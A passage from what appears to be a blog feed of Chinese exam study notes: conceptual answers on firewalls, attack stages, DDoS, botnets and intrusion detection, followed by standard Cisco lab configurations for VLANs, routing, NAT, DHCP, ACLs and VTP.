定义）</li><li>还包括屏蔽主机防火墙（单堡垒主机）、屏蔽主机防火墙（双宿堡垒主机防火墙）、屏蔽子网防火墙等</li><li>防火墙的作用是隔离风险区域和安全区域的连接，阻止不希望的或者未授权的通信进入内部网，通过边界控制强化内部网的安全，同时不会妨碍内部网对外部网的访问</li><li>防火墙的功能：访问控制功能、内容控制功能、日志功能、集中管理功能、自身安全和可用性<ul><li>访问控制功能</li><li>内容控制功能</li><li>日志功能</li><li>集中管理功能</li><li>自身安全和可用性</li></ul></li><li>防火墙的局限性<ul><li>防火墙不能防御不经由防火墙的攻击</li><li>防火墙不能防范来自内部的威胁</li><li>防火墙不能防止病毒感染的程序和文件进出内部网</li><li>防火墙不能防止数据驱动式的攻击</li></ul></li></ul></li><li><strong><font color=red>简述包过滤原理</font></strong><ul><li>将IP数据报的各种包头信息与防火墙内建规则进行比较，然后根据过滤规则有选择地阻止或允许数据包通过防火墙。</li><li>这些过滤规则也称作访问控制表(access control table)。流入数据流到达防火墙后。</li><li>防火墙就检查数据流中每个IP数据报的各种包头信息。例如源地址、目的地址、源端口、目的端口、协议类型,来确定是否允许该数据包通过。一旦该包的信息匹配了某些特征,则防火墙根据其内建规则对包进行相应的操作，选择是否接收/丢弃 策略包</li></ul></li><li><strong>状态检查技术具有哪些特点？(小题)</strong><ul><li>对用户透明，能够在OSI/RM网络层上通过IP地址和端口号过滤进出的数据包</li><li>可以在OSI/RM应用层上检查数据包内容，查看这些内容是否符合安全规则</li><li>克服了包过滤技术和代理服务技术的局限性，能够根据协议、端口及源地址、目的地址的具体情况决定数据包是否通过</li><li>对于每个安全策略允许的请求，状态监测技术启动相应的进程，可快速的确认符合授权标准的数据包，使得运行速度加快</li></ul></li><li><strong><font color=red>简述屏蔽子网防火墙的结构</font></strong><ul><li>使用了两个包过滤路由器，一个在堡垒机和internet之间，称为外部屏蔽路由器，一个在堡垒主机和内部网络之间称为内部屏蔽路由器</li><li>每一个路由器都被配置为只和堡垒主机交换流量。外部路由器使用标准过滤来限制对堡垒主机的外部访问,内部路由器则拒绝不是堡垒主机发起的进人数据包,并只把外出数据包发给堡垒主机。</li></ul></li></ul><h3 id="第八章-网络攻击与防范"><a href="#第八章-网络攻击与防范" class="headerlink" title="第八章 网络攻击与防范"></a>第八章 网络攻击与防范</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 本章考点如下</span><span class="token operator">-</span> Dos与DDos 简答题<span class="token operator">-</span> 在入侵检测上同时存在大题和小题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="思考题-5"><a href="#思考题-5" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong><font color=red>简述网络攻击的过程？（掌握）</font></strong><ul><li>网络攻击的过程可以归纳为：隐藏自身，踩点与扫描，侵入系统并提升权限，种植后门，网络隐身五个步骤<ul><li><strong>1 隐藏自身：</strong></li><li><strong>2 踩点与扫描：</strong></li><li><strong>3 侵入系统并提升权限</strong></li><li><strong>4 种植后门：</strong></li><li><strong>5 网络隐身：</strong>在成功侵入目标主机并植入后门后需要清除登录日志及其他相关日志</li></ul></li></ul></li><li><strong>在整个DDos攻击过程中都有哪些角色？分别完成什么功能？</strong><ul><li>DDos攻击过程中涉及四种主机：攻击者，主控傀儡机，攻击傀儡机，被攻击者<ul><li>攻击者：发布实施DDos的指令，是整个DDos攻击中的主控平台</li><li>主控傀儡机：通过这些主机分别控制大量的攻击傀儡机，能够接收攻击者发来的特殊指令，而且可以把这些指令发送到攻击傀儡机上</li><li>攻击傀儡机： 攻击傀儡机是攻击的直接执行者，直接向被攻击主机发起攻击</li><li>被攻击者：是DDos攻击的直接受害者，目前多为一些大型企业的网络和数据库系统</li></ul></li></ul></li><li><strong><font color=red>简述僵尸网络的工作原理？（掌握 大题）</font></strong><ul><li>僵尸网络的概念：僵尸网络是攻击者处于恶意目的，融合传统的恶意软件，如计算机病毒，蠕虫和木马等技术，传播僵尸程序感染大量主机，并通过一对多的命令与控制信道被感染的主机所组成的叠加网络。<ul><li>僵尸网络利用其所控制的僵尸主机群发起攻击，其活动可以分为四个阶段<ol><li>感染目标主机构建僵尸网络</li><li>发布命令，控制僵尸程序</li><li>展开攻击</li><li>攻击善后，主要目的是隐藏攻击痕迹，防止被追踪溯源</li></ol></li></ul></li></ul></li><li><strong>什么是入侵检测？ 入侵检测的典型过程是什么？</strong><ul><li>入侵检测是指在计算机网络或计算机系统中若干关键点收集信息并对收集到的信息进行分析，从而判断是网络或系统中是否有违反安全策略的行为和被攻击的迹象。它是对入侵行为的发觉</li><li>入侵检测的典型过程是：信息收集、信息（数据）预处理，数据的检测分析，根据安全策略做出响应，有的还包括检测效果的评估</li></ul></li><li><strong>IDS的基本功能是什么？典型的IDS包括哪些实体？</strong><ul><li>入侵检测系统（IDS）是完成入侵检测的功能的软件、硬件的组合；是对敌对攻击在适当的时间内进行检测并做出响应的一种工具</li><li>典型的IDS包括事件生成器、事件分析器、事件数据库、响应单元、目录服务器<ul><li>事件生成器：事件生成器是采集和过滤事件数据的程序和模块，负责收集原始数据</li><li>事件分析器：事件分析器是分析事件数据和任何CIDF组件传送给他的各种数据。</li><li>事件数据库：负责存放各种数据原始数据或已加工过的数据</li><li>响应单元： 是针对分析组件所产生的分析结果，根据响应策略采取响应的行为，发出命令响应攻击</li><li>目录服务器： 用于各组件定位其他组件，以及控制其他组件传递的数据并认证其他组件的使用，以防止其他组件的使用，以防止入侵检测系统本身受到攻击。</li></ul></li></ul></li><li><strong>简述异常检测和误用检测的基本原理？</strong> <ul><li>异常检测原理： 任何一种入侵行为都由于其偏离正常或者所期望的系统和用户的活动规律而被检测出来</li><li>误用检测原理： 建立在对过去各种已知网络入侵方法和系统缺陷知识的积累之上。入侵检测系统中存储着一系列已知的入侵行为描述，当某个系统的调用与一个已知的入侵行为相匹配时，则认为是入侵行为</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工程——CISCO设备基本语法</title>
      <link href="/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="网络工程——CISCO设备基本语法"><a href="#网络工程——CISCO设备基本语法" class="headerlink" title="网络工程——CISCO设备基本语法"></a>网络工程——CISCO设备基本语法</h2><p>[TOC]</p><h3 id="交换机配置："><a href="#交换机配置：" class="headerlink" title="交换机配置："></a>交换机配置：</h3><pre class="line-numbers language-none"><code class="language-none">Switch&gt;enable进入特权模式Switch#configure terminal进入全局配置模式Switch(config)#hostname S1更改用户名S1(config)#enable password ciscoS1(config)#line con 0S1(config-line)#password ciscoS1(config-line)#loginS1(config-line)#line vty 0 15S1(config-line)#password ciscoS1(config-line)#loginS1(config-line)#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="管理配置地址："><a href="#管理配置地址：" class="headerlink" title="管理配置地址："></a>管理配置地址：</h4><pre class="line-numbers language-none"><code class="language-none">S1(config)# interface Vlan 1进入vlan 1的接口配置模式S1(if-config)# ip address 192.168.1.2 255.255.255.0设置接口IP地址与子网掩码S1(if-config)# no shutdown开启端口S1(if-config)# exitS1(config)# ip default-gateway 192.168.1.1配置默认网关IP地址S1(config)# end  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>其他交换机操作：</strong></p><blockquote><p>S1# show running-config     查看当前设备配置 </p></blockquote><blockquote><p>S1# show flash     显示<em>flash</em>存储器信息以及存储器中的IOS映象文件 </p></blockquote><blockquote><p>S1# show version     显示系统硬件的配置 </p></blockquote><p><strong>交换机Vlan划分及信息备份</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch_A#vlan database进入vlan数据库模式Switch_A(vlan)#vlan 20 name VLAN20 Switch_A#configure terminalSwitch_A(config)#interface f0&#x2F;20Switch_A(config-if)#switchport mode access将端口的工作模式改为accessSwitch_A(config-if)#switchport access vlan 20指定接口所属vlan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>保存配置及IOS到TFTP</strong></p><blockquote><p>Copy starup-config(or running-config)  tftp<br>copy flash tftp</p></blockquote><h4 id="STP与RSTP"><a href="#STP与RSTP" class="headerlink" title="STP与RSTP"></a>STP与RSTP</h4><p><strong>查看生成树</strong></p><blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">Show spanning<span class="token operator">-</span>tree   <span class="token comment">#识别根桥、阻塞端口和转发端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>配置快速生成树：</strong></p><blockquote><pre class="line-numbers language-none"><code class="language-none">Switch (config)# spanning-tree mode rapid-pvst  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>可以通过什么方法查看交换机的生成树阻塞了那个端口？</strong></p><blockquote><p>可以通过Show spanning-tree指令查看</p></blockquote><ol><li>Disabled（禁用状态）：不转发数据帧，不学习MAC地址表，不参与生成树计算</li><li>Blocking（阻塞状态）；不转发数据帧，不学习MAC地址表，接收并处理BPDU，不发生BPDU</li><li>Listening（监听状态）：不转发数据帧，不学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Learning（学习状态）：不转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Forwarling（转发状态）：转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU </li></ol><p><strong>总结生成树中根桥的选举规则</strong></p><ul><li>选择根桥的依据是网桥ID，网桥ID是唯一的，网桥ID由网桥优先级 和 网桥的MAC地址组成,网桥ID中的MAC地址是自身交换机的MAC地址</li><li>在选择根桥的时候，是依据看哪台交换机的ID值最小，优先级小的被选择为根网桥，在优先级相同的情况下，MAC地址小的为根网桥</li></ul><p><strong>更改根桥优先级</strong></p><p>所有交换机的优先级都是默认的32768，要实现变更根桥，只要将交换机的优先级更改为小于32768，同时优先级的修改以4096为增量</p><blockquote><p>在全局配置模式下执行如下命令∶spanning-tree vlan 1 priority 4096</p></blockquote><p>这样，Switch3的优先级值就变成4097，成为了网络中最小的ID，从而成为了根桥。</p><h4 id="三层交换实现VLAN间通信"><a href="#三层交换实现VLAN间通信" class="headerlink" title="三层交换实现VLAN间通信"></a>三层交换实现VLAN间通信</h4><p><strong>将端口分配给VLAN</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">config terminalinterface f0&#x2F;1switchport mode accessswitchport access vlan 10&#x2F;&#x2F;端口1分配给VLAN10exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>在交换机上给VLAN分配IP地址</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch#config terminalInterface vlan 10Ip address 192.168.10.1 255.255.255.0&#x2F;&#x2F;VLAN10分配IP地址No shutdownExit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>三次交换机上为VLAN配置IP地址作用是什么？<ul><li><del><strong>vlan 上配IP就是真实的网关地址， 主要用于两台或者多台三层交换机之间进行通信</strong></del>（网络说法不一定可信）</li></ul></li><li>如何采用此种方法实现多个（超过两个）VLAN间路由？<ul><li>将二层交换机与三层交换机之间的接口设置为trunk模式，使得不同vlan可以经三层交换机实现路由</li></ul></li></ol><h3 id="路由器配置："><a href="#路由器配置：" class="headerlink" title="路由器配置："></a>路由器配置：</h3><h4 id="路由器常用命令"><a href="#路由器常用命令" class="headerlink" title="路由器常用命令"></a>路由器常用命令</h4><ul><li>Hostname    #设置交换机的主机名</li><li>Show startup-config    显示交换机初始化配置 </li><li>Show running-config    查看当前设备配置 </li><li>Show flash    显示<em>flash</em>存储器信息以及存储器中的IOS映象文件 </li><li>Show version    显示系统硬件的配置</li><li>Show interface **    命令来查察接口的信息</li><li>Show controllers **    查看接口的硬件信息 </li></ul><ol><li><p><strong>通过实验，说明如何保存路由器的启动配置 startup-config？</strong></p><blockquote><p style="color:blue;">Router# copy running-config startup-config</p></blockquote></li><li><p><strong>若将两台路由器互联，配置完各个接口的IP地址以后，两台PC是否可以ping通，为什么？在路由器上Ping另外一台路由器的互联接口是否可ping通，为什么？</strong> </p><blockquote><p style="color:blue;">不可以ping通，两台路由器之间缺少相应的路由，可以ping通，两个路由器端口直接相连。</p></blockquote></li></ol><p><strong>路由器的基本管理</strong></p><blockquote><p style="color:blue;">Router# copy running-config tftp    配置文件保存</p></blockquote><blockquote><p style="color:blue;">Router# Copy tftp running-config    配置文件恢复</p></blockquote><blockquote><p style="color:blue;">Router#copy flash tftp    保存操作系统</p></blockquote><p><strong>配置静态路由</strong></p><blockquote><p>ip route [目的网络号] [子网掩码] [下一跳IP地址]</p></blockquote><p><strong>配置默认路由：</strong></p><blockquote><p> ip route 0.0.0.0 0.0.0.0  [下一跳IP地址]</p></blockquote><ol><li><p><strong>静态路由的下一跳可以采用接口号表示，那么可以将本实验中的静态路由或默认路由写成什么表达形式？</strong></p><ul><li>可以将下一跳IP地址更换成出接口</li><li>静态路由：ip route [目的网络号] [子网掩码] [出接口]</li><li>默认路由：ip route 0.0.0.0 0.0.0.0  [出接口]</li></ul></li><li><p><strong>根据实验和路由知识，若静态路由和默认路由同时存在的话，分组路由的过程中优先选择静态路由还是默认路由？为什么？</strong></p><ul><li>静态路由。在路由表中默认路由排在最后，同时存在静态路由与默认路由时，将优先使用静态路由</li></ul></li></ol><p><strong>配置DHCP：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ip dhcp pool <span class="token punctuation">[</span>poolname<span class="token punctuation">]</span> <span class="token operator">//</span>创建地址池，名字为poolnamenetwork <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">//</span>配置分配的网段 default<span class="token operator">-</span>router <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.1</span>   <span class="token operator">//</span>配置网关dns<span class="token operator">-</span>server <span class="token number">219.218</span><span class="token number">.18</span><span class="token number">.18</span> <span class="token operator">//</span> 配置DNS服务器的IP地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>PC端如何使用命令行方式释放或获取新的IP地址？（ipconfig 参数）</p><blockquote><p>ipconfig /release释放本机IP地址</p><p>ipconfig /renew，获得一个新的IP地址</p></blockquote></li><li><p>若DHCP的配置中，使用的是Network 192.168.1.0 255.255.255.0，那么R1所连接本地网络中主机获取的IP地址范围是什么？</p><ul><li>192.168.1.1到192.168.1.254 <del>（应该）</del></li></ul></li><li><p>根据实验说明：主机获取的IP地址、子网掩码、网关和DNS分别与DHCP配置中那条命令对应？</p><ul><li>network命令配置主机获取的IP地址，子网掩码，default-router配置网关，dns-server配置DNS域名解析服务器。</li></ul></li></ol><p><strong>查看DHCP状态:</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">R1#show ip dhcp binding  &#x2F;&#x2F; 查看IP分配绑定状态R1#show ip dhcp pool [poolname]   &#x2F;&#x2F; 查看dhcp地址池R1#show ip dhcp server statistics &#x2F;&#x2F; 查看dhcp服务状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="二层交换机与路由器实现VLAN间路由"><a href="#二层交换机与路由器实现VLAN间路由" class="headerlink" title="二层交换机与路由器实现VLAN间路由"></a>二层交换机与路由器实现VLAN间路由</h4><p><strong>在交换机上创建Trunk端口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface f0&#x2F;1                       &#x2F;&#x2F;与路由器级联接口为f0&#x2F;1switchport mode trunk       &#x2F;&#x2F;封装为Trunk口end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>配置路由器子接口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Router#configure terminalInterface f0&#x2F;0No shutexitInterface f0&#x2F;0.10Encapsulation dot1q 10    &#x2F;&#x2F;子接口1对应VLAN 10Ip address 192.168.10.1 255.255.255.0Interface f0&#x2F;0.20Encapsulation dot1q 20Ip address 192.168.20.1 255.255.255.0    &#x2F;&#x2F;子接口2 对应VLAN 20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>激活路由选择协议</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Switch(config)#Ip routing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>使用这种方式配置VLAN间路由的原理是什么？</p><p> 路由器的一个接口上通过配置逻辑接口或子接口的方式，<code>实现原来相互隔离的不同VLAN（虚拟局域网）之间的互联互通</code> </p></li><li><p>如果不使用子接口，而是利用路由器的两个以太网口分别连接到交换机两个不同VLAN中的接口上（PC、交换机与路由器级联接口也划分入相应的VLAN），是否能够连通？在这种情况下，路由器与交换机之间的级联接口不配置Trunk是否可以连通？</p><ul><li>可以连通， 在路由器上为每一个VLAN都配置一个物理连接后，数据流将分不同VLAN流到路由器上不同的端口中，再通过路由器进行路由的转发，以实现VLAN之间的通信。 </li></ul></li></ol><h4 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h4><p><strong>静态NAT：</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface  f0&#x2F;0ip  adddress  172.16.1.1 255.255.255.0ip  nat  inside# 定义内部接口no shutdown(config)#interface   f0&#x2F;1ip  address  202.96.134.1 255.255.255.0ip  nat  outside# 定义外部接口no shutdown(config)#ip  nat  inside  source  static 172.16.1.100   202.96.134.100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p style="color:blue;">ip nat inside source static    [本地IP地址]     [目标ip地址] # 初始于 inside 向 outside 发送，在outside接口执行源地址翻译 </blockquote><blockquote><p style="color:blue;">ip nat outside source static [global-address] [local-address]， 初始于 outside 向 inside 发送，在inside接口执行源地址翻译 </blockquote><p><strong>动态NAT配置：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">10</span> permit <span class="token number">172.16</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span><span class="token comment"># 创造一个访问控制列表（ACL）,表号为10，内容是允许172.16.1.0 </span><span class="token comment"># access-list [表号] [permit/deny] [网络号] [反掩码]</span>ip nat pool MYNAT <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.100</span> <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.110</span> netmask <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token comment"># 配置NAT地址池的名字以及 IP地址范围、子网掩码</span>ip nat inside source <span class="token builtin">list</span> <span class="token number">10</span> pool MYNAT<span class="token comment"># 将ACL 10 匹配得内部源IP地址，转换为地址池MYNAT 中的IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><strong>将静态路由换成默认路由改如何配置？如果从外网向内网私有IP发起通信，是否可以ping通？</strong></p><ul><li>不能ping通，静态NAT技术实现的就是对内部主机的隐藏</li></ul></li><li><p><strong>对第5步中：ip nat inside source list 10 pool MYNAT 命令中，如果使用参数overload，实验结果与本实验有什么区别？</strong></p><ul><li><p>使用参数overload，意味使用PAT（网络地址端口转换）技术，可将多个内部地址映射为一个合法公网地址,但以不同的协议端口号与不同的内部地址相对应 </p></li><li><p> 内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问 </p></li><li><p> ip nat inside source list 10  pool MYNAT overload </p></li></ul><p>  <strong><del>此外内容需要在仿真上做一遍，我还没弄</del></strong></p></li></ol><h4 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h4><p><strong>RIP路由协议</strong></p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">Router rip# 启动RIPnetwork 1.0.0.0network 12.0.0.0 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>OSPF路由协议</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Router ospf <span class="token number">1</span><span class="token comment"># 启动ospf协议</span>Network <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span>Network <span class="token punctuation">[</span>网络号<span class="token punctuation">]</span> <span class="token punctuation">[</span>反掩码<span class="token punctuation">]</span> <span class="token punctuation">[</span>路由区域<span class="token punctuation">]</span>Network <span class="token number">12.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检查OSPF路由协议的命令</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Show ip ospf neighbor    &#x2F;&#x2F; 显示现在的Ospf邻居，其中包括邻居ID（Route-id)、优先级、状态、存活时间、IP地址、接口Show ip osfp interface    &#x2F;&#x2F;查看接口是否被加入到正确的区域中，该命令还可以显示各种定时器hello间隔等和邻居关系。Show ip route ospf    &#x2F;&#x2F;显示路由器知道的OSPF路由Show ip ospf database    &#x2F;&#x2F;查看OSPF数据库，包括各种LSA的数据状态Clear ip ospf <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>动态路由协议的配置主要包含哪两个步骤？</p><blockquote><p><del>配置各路由器、PC的相关配置和配置路由协议（我猜的，没找到确切答案）</del></p></blockquote></li><li><p>通过RIP协议的调试步骤，可以得出RIP路由表的默认更新时间约是多少？</p><ul><li>RIP路由协议默认更新周期是30秒</li></ul></li><li><p>OSPF协议通过那条命令可以获得路由器的ID？</p></li></ol><ul><li>show ip protocols</li></ul><ol start="4"><li><p>如果两台路由器一台运行RIP第1版，一台运行第2版，两台主机是否可以ping通？通过使用show ip route 查看两台路由器的路由表，确定版本1与版本2之间究竟谁可以接受谁的路由更新？（单边邻居关系）</p><blockquote><p style="color:blue;">两台主机不能ping通，RIP版本1可以接受版本2，因为RIPv2需要包含子网掩码，而版本1并不含有子网掩码，版本1的协议发往版本2后，版本2会将该报文丢弃，而当版本1接受到版本2的报文时，版本1会收下版本2的报文</p></blockquote></li></ol><h4 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h4><pre class="line-numbers language-、" data-language="、"><code class="language-、">access-list[list number][permit&#x2F;deny][source address][address][wildcard mask][log]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>标准ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> deny host <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.2</span><span class="token comment"># 拒绝来自1.1.1.2的主机通过</span><span class="token comment"># 可以利用关键字"host"来代表通配符掩码0.0.0.0,表示一台主机</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> permit <span class="token builtin">any</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">1</span> out<span class="token comment"># 访问列表的出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>拓展ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> deny tcp <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> <span class="token number">2.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> eq telnet<span class="token comment"># telnet使用的是TCP的23号端口、eq其实是等于....</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> permit tcp <span class="token builtin">any</span> <span class="token builtin">any</span><span class="token comment"># 这两条语句的顺序;访问表语句的处理顺序是由上到下的。如果我们将两个语句顺序颠倒，将permit语句放在deny语句的前面，则我们将不能过滤来自主机地址的报文</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">101</span> <span class="token keyword">in</span><span class="token comment">#访问控制列表 出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>根据本次实验，你认为ACL一般有哪些配置步骤？</p><p><strong><del>跟上面那个动态路由一样，我没弄出来</del></strong></p></li><li><p>在步骤4中，如果要使得1.0.0.0整个网络无法访问2.0.0.0该如何配置？</p><ul><li>可以使用Access-list 1 deny 指令阻止整个网段的访问</li></ul></li><li><p>在步骤5中，虽然禁止的是telnet，但此时PC1是否可以ping通PC2?为达到ping通的目的，应该如何处理？</p><ul><li>ping 命令通过ICMP协议进行报文传输，在访问控制类别中没有运行ICMP或者IP报文的访问，所以ping指令也无法通信。</li></ul></li><li><p>禁止FTP应该如何配置访问控制列表？</p><ul><li>通过access-list 1 deny命令禁止代表FTP协议的21号端口即可禁止FTP</li></ul></li></ol><h4 id="VTP"><a href="#VTP" class="headerlink" title="VTP"></a>VTP</h4><p><strong>配置级联接口的Trunk封装</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">switchport trunk encapsulation dot1q<span class="token comment">#接口的trunk封装802.1Q协议，用于启用trunk</span>switchport mode trunk<span class="token comment">#设置接口模式为trunk模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置交换机的工作模式</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">vtp mode <span class="token punctuation">[</span>server<span class="token operator">/</span>client<span class="token operator">/</span>transparent<span class="token punctuation">]</span> <span class="token comment">#分别是服务器，客户端和透明模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>VTP服务器控制着它们所在域中VALN的生成和修改</li><li>VTP客户机不允许管理员创建、修改或删除VLAN。它们监听本域中其他交换机的VTP通告，并相应修改它们的VTP配置情况</li><li>VTP透明模式中的交换机不参与VTP，交换机处于透明模式时，不通告其VLAN配置信息。它的VLAN数据库更新与收到的通告也不保持同步。可以创建和删除本地的VLAN。这些VLAN的变更不会传播到其他任何交换机上</li></ul><p><strong>更改交换机的域名</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch (config)# vtp domain qrnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>如果将S2的工作模式更改为透明模式，S2是否会学习S1的VLAN划分？<ul><li>不会，透明模式不会学习服务器的配置</li></ul></li></ol><h3 id="押题："><a href="#押题：" class="headerlink" title="押题："></a>押题：</h3><h4 id="三层交换实现VLAN间通信-https-blog-csdn-net-weixin-47678542-article-details-121749703"><a href="#三层交换实现VLAN间通信-https-blog-csdn-net-weixin-47678542-article-details-121749703" class="headerlink" title="[三层交换实现VLAN间通信][https://blog.csdn.net/weixin_47678542/article/details/121749703]"></a>[三层交换实现VLAN间通信][<a href="https://blog.csdn.net/weixin_47678542/article/details/121749703]">https://blog.csdn.net/weixin_47678542/article/details/121749703]</a></h4><p>[路由器实现Vlan间通信][<a href="https://blog.csdn.net/weixin_47678542/article/details/121844112]">https://blog.csdn.net/weixin_47678542/article/details/121844112]</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 知识点汇总</title>
      <link href="/2023/02/10/Linux/"/>
      <url>/2023/02/10/Linux/</url>
      
